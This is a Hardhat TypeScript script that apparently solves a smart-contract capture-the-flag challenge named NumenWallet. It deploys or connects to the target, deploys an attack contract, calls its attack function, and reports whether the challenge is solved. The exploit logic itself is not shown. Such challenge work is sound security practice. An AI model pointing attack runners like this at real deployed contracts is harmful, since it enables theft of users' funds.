import chalk from "chalk";
import { ethers } from "hardhat";
import { NumenWallet__factory, NumenWalletAttack__factory } from "../../typechain";

function log(s:string){
    console.log(`${chalk.green("[-] ")+s}`)
}

async function main() {
    const signers = await ethers.getSigners();
    const provider = ethers.provider;
    const network = await provider.getNetwork();
    const deployer = signers[0];
    const attacker = signers[2];

    log(`Running on the ${chalk.yellow(network.name)} network`);
    log(`Attacker address: ${chalk.yellow(attacker.address)}`);
    log(`Attacker balance: ${chalk.yellow(ethers.formatEther(await provider.getBalance(attacker)))} ETH`);

    let numenWalletContract;
    let tx;
    if(network.name == "hardhat") {
        numenWalletContract = await new NumenWallet__factory(deployer).deploy();
        await numenWalletContract.waitForDeployment();
        numenWalletContract = numenWalletContract.connect(attacker);
        log(`Successfully deployed the target contract to address ${chalk.yellow(await numenWalletContract.getAddress())}!`)
    } else if (network.name == "remote") {
        const contractAddress = "0x0000000000000000000000000000000000000000";
        numenWalletContract = NumenWallet__factory.connect(contractAddress, attacker);
        log(`Successfully connected to the target contract with address ${chalk.yellow(await numenWalletContract.getAddress())}!`)
    }

    if(numenWalletContract) {
        const numenWalletAttack = await new NumenWalletAttack__factory(attacker).deploy();
        await numenWalletAttack.waitForDeployment();
        tx = await numenWalletAttack.attack(await numenWalletContract.getAddress());
        await tx.wait();
        log(`Is solved: ${await numenWalletContract.isSolved()}`);
    }


}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});